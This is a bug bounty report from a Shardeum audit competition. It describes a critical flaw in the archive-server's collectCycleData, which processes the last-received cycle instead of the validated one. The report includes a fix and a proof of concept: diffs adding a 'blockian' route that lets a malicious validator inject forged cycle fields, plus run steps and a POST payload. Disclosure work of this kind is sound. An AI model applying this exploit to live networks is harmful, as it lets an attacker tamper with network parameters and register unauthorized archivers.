# 39626 \[W\&A-Critical] malicious validator can overwrite any cycle data

## #39626 \[W\&A-Critical] Malicious Validator Can Overwrite Any Cycle Data

**Submitted on Feb 3rd 2025 at 16:59:16 UTC by @Blockian for** [**Audit Comp | Shardeum: Ancillaries III**](https://immunefi.com/audit-competition/audit-comp-shardeum-ancillaries-iii)

* **Report ID:** #39626
* **Report Type:** Websites and Applications
* **Report severity:** Critical
* **Target:** <https://github.com/shardeum/archive-server/tree/itn4>
* **Impacts:**
  * Taking and/modifying authenticated actions (with or without blockchain state interaction) on behalf of other users without any interaction by that user, such as:
* Changing registration information
* Commenting
* Voting
* Making trades
* Withdrawals, etc.
  * Direct theft of user funds

### Description

## Shardeum Ancillaries Bug Report

### Malicious Validator Can Overwrite Any Cycle Data

#### Summary

A vulnerability in the `collectCycleData` function allows a malicious Validator to manipulate the Archiver by processing a fake cycle controlled entirely by the Validator. This issue enables the Validator to override legitimate cycles, potentially altering critical network parameters such as adding unauthorized Archivers—an action that should be restricted to the Shardeum team.

### Root Cause Analysis

Examining the `collectCycleData` function:

```ts
export function collectCycleData(
  cycleData: P2PTypes.CycleCreatorTypes.CycleData[],
  senderInfo: string
): void {
  for (const cycle of cycleData) {
    // Logger.mainLogger.debug('Cycle received', cycle.counter, senderInfo)
    let cycleToSave = []
    if (receivedCycleTracker[cycle.counter]) {
      if (receivedCycleTracker[cycle.counter][cycle.marker]) {
        if (!receivedCycleTracker[cycle.counter][cycle.marker]['senderNodes'].includes(senderInfo)) {
          receivedCycleTracker[cycle.counter][cycle.marker]['receivedTimes']++
          receivedCycleTracker[cycle.counter][cycle.marker]['senderNodes'].push(senderInfo)
        }
      } else {
        if (!validateCycleData(cycle)) continue
        receivedCycleTracker[cycle.counter][cycle.marker] = {
          cycleInfo: cycle,
          receivedTimes: 1,
          saved: false,
          senderNodes: [senderInfo],
        }
        if (config.VERBOSE) Logger.mainLogger.debug('Different Cycle Record received', cycle.counter)
      }
    } else {
      if (!validateCycleData(cycle)) continue
      receivedCycleTracker[cycle.counter] = {
        [cycle.marker]: {
          cycleInfo: cycle,
          receivedTimes: 1,
          saved: false,
          senderNodes: [senderInfo],
        },
      }
    }
    if (config.VERBOSE)
      Logger.mainLogger.debug('Cycle received', cycle.counter, receivedCycleTracker[cycle.counter])
    const minCycleConfirmations =
      Math.min(Math.ceil(NodeList.getActiveNodeCount() / currentConsensusRadius), 5) || 1

    for (const value of Object.values(receivedCycleTracker[cycle.counter])) {
      if (value['saved']) {
        // If there is a saved cycle, clear the cycleToSave of this counter; This is to prevent saving the another cycle of the same counter
        for (let i = 0; i < cycleToSave.length; i++) {
          // eslint-disable-next-line security/detect-object-injection
          receivedCycleTracker[cycle.counter][cycleToSave[i].marker]['saved'] = false
        }
        cycleToSave = []
        break
      }
      if (value['receivedTimes'] >= minCycleConfirmations) {
        cycleToSave.push(cycle) // BUG HERE!
        value['saved'] = true
      }
    }
    if (cycleToSave.length > 0) {
      processCycles(cycleToSave)
    }
  }
  // ... some non relevant stuff
}
```

#### Vulnerability Breakdown

When processing a new cycle, the function follows these steps:

1. If the `cycle.counter` and `cycle.marker` exist in `receivedCycleTracker`, it increments `receivedTimes`.
2. Otherwise, it validates the cycle using `validateCycleData` and adds it to `receivedCycleTracker`.
3. If `receivedTimes` meets or exceeds `minCycleConfirmations`, the cycle is added to `cycleToSave`.
4. Finally, `processCycles(cycleToSave)` is called to process the cycle.

**The Problem**

The cycle added to `cycleToSave` is simply the last cycle received, not necessarily the validated one. This means that the last validator to submit a cycle can modify its properties and force an incorrect cycle into the Archiver, potentially altering network parameters.

### Exploitation Steps

#### Scenario

Assume `minCycleConfirmations == 5` and there are five connected Validators, with only one being malicious.

#### Steps to Exploit

1. The first four Validators submit the correct cycle (`cycle.counter == x`, `cycle.marker == y`).
2. The malicious Validator submits a modified cycle while maintaining the same `cycle.counter` and `cycle.marker`. For example, it could add an unauthorized Archiver.
3. The Archiver receives the fake cycle and sees `receivedTimes == 5`, adding the newly received cycle to `cycleToSave`.
4. The Archiver processes the fake cycle (registering the unauthorized Archiver or modifying other network parameters, depending on the payload).

### Impact

* A malicious Validator can manipulate key network parameters, including node counts, Archivers, and more.
* The Validator effectively gains control over the information processed by Archivers, allowing unauthorized data modifications.
* The ability to register Archivers without Shardeum team approval is a critical security risk.

### Proposed Fix

Modify how `cycleToSave` is assigned:

Current (Vulnerable) Code:

```ts
cycleToSave.push(cycle)
```

Secure Fix:

```ts
cycleToSave.push(receivedCycleTracker[cycle.counter][cycle.marker].cycleInfo)
```

#### Why This Works

The corrected version ensures that only the cycle that underwent validation is stored and processed, preventing last-minute tampering.

### Proof of Concept

## Proof of Concept (PoC)

Basically, all we need to do is create a malicious Validator to execute this attack, but to make the POC easier to perform, I added some additional logs to the Archiver for additional visibility, I suggest adding them as well.\
In the `collectCycleData` function add the following logs after the `minCycleConfirmations` calculation:

```ts
    Logger.mainLogger.info(`------ BLOCKIAN ------`)
    Logger.mainLogger.info(`BLOCKIAN1 -> minCycleConfirmations: ${minCycleConfirmations}, senderInfo: ${senderInfo}`)
    Logger.mainLogger.info(`BLOCKIAN2 -> receivedTimes: ${receivedCycleTracker[cycle.counter][cycle.marker]['receivedTimes']}, senderInfo: ${senderInfo}`)
    Logger.mainLogger.info(`BLOCKIAN3 -> cycle: ${JSON.stringify(cycle)}, senderInfo: ${senderInfo}`)
    Logger.mainLogger.info(`------ BLOCKIAN ------`)
```

#### Creating a Malicious Validator

Modify the `core` repository with the following diffs:

**Diff 1 - Adding a Custom Route to Modify the Cycle**

```diff
diff --git a/src/p2p/Join/routes.ts b/src/p2p/Join/routes.ts
index f415f8ab..f26544cd 100644
--- a/src/p2p/Join/routes.ts
+++ b/src/p2p/Join/routes.ts
@@ -328,6 +328,23 @@ const standbyRefreshRoute: P2P.P2PTypes.Route<Handler> = {
   },
 }
 
+const blockianRoute: P2P.P2PTypes.Route<Handler> = {
+  method: 'POST',
+  name: 'blockian',
+  handler: (req, res) => {
+    console.log("got request from blockian")
+    const body = req.body
+    if (body.debug) {
+      return res.json({ ...body, gotBlockian: true })
+    }
+
+    Comms.modifyCycle.shouldModify = body.shouldModify
+    Comms.modifyCycle.cycle = body.cycle
+
+    res.json({ success: true })
+  },
+}
+
 const joinedV2Route: P2P.P2PTypes.Route<Handler> = {
   method: 'GET',
   name: 'joinedV2/:publicKey',
@@ -778,7 +795,7 @@ const gossipStandbyRefresh: P2P.P2PTypes.GossipHandler<
 }
 
 export const routes = {
-  external: [cycleMarkerRoute, joinRoute, joinedRoute, joinedV2Route, acceptedRoute, unjoinRoute, standbyRefreshRoute],
+  external: [blockianRoute, cycleMarkerRoute, joinRoute, joinedRoute, joinedV2Route, acceptedRoute, unjoinRoute, standbyRefreshRoute],
   gossip: {
     'gossip-join': gossipJoinRoute,
     'gossip-valid-join-requests': gossipValidJoinRequests,
```

**Diff 2 - Enabling Cycle Modification**

```diff
diff --git a/src/p2p/Comms.ts b/src/p2p/Comms.ts
index b74eb8fe..8f2c9324 100644
--- a/src/p2p/Comms.ts
+++ b/src/p2p/Comms.ts
@@ -30,6 +30,8 @@ import { nodeListFromStates } from './Join'
 
 /** ROUTES */
 
+export let modifyCycle: {shouldModify: boolean, cycle: P2P.CycleCreatorTypes.CycleRecord } = { shouldModify: false, cycle: null }
+
 type GossipReq = P2P.P2PTypes.LooseObject
 
 // const gossipInternalRoute: P2P.P2PTypes.InternalHandler<GossipReq> = async (
```

**Diff 3 - Injecting Malicious Data into the Cycle**

```diff
diff --git a/src/p2p/Archivers.ts b/src/p2p/Archivers.ts
index 8ac9ac3d..ca0e9c48 100644
--- a/src/p2p/Archivers.ts
+++ b/src/p2p/Archivers.ts
@@ -837,6 +837,7 @@ export function sendData() {
       cyclesWithMarker.push({
         ...cycleRecords[i],
         marker: computeCycleMarker(cycleRecords[i]),
+        ...(Comms.modifyCycle.shouldModify ? Comms.modifyCycle.cycle : {})
       })
     }
     // Update lastSentCycle
@@ -891,6 +892,7 @@ export function sendData() {
             cyclesWithMarker.push({
               ...cycleRecords[i],
               marker: computeCycleMarker(cycleRecords[i]),
+              ...(Comms.modifyCycle.shouldModify ? Comms.modifyCycle.cycle : {})
             })
           }
           // Update lastData
```

***

### Executing the PoC

#### 1. Setup

1. In the Archiver repo:

   ```sh
   npm link
   ```
2. In the Core repo:

   ```sh
   npm link
   ```
3. In the Shardeum repo:

   ```sh
   npm link @shardeum-foundation/archiver @shardeum-foundation/core
   ```

#### 2. Attack Execution

1. Start the system:

   ```sh
   LOAD_JSON_CONFIGS=debug-10-nodes.config.json shardus start 10
   ```
2. Monitor logs for:

   ```
   BLOCKIAN1 -> minCycleConfirmations: 2
   ```
3. Identify the Validator submitting the cycle second using:

   ```
   BLOCKIAN2 -> receivedTimes: 2, senderInfo:
   ```
4. Send a POST request to the malicious Validator’s new `blockian` route:

   ```json
   {
       "shouldModify": true,
       "cycle": { "maxSyncTime":15000 }
   }
   ```

**NOTE**: `cycle` can contain and false information, for this POC we simply change the `maxSyncTime`.\
5\. Observe the Archiver accepting and storing the fake cycle without issues.
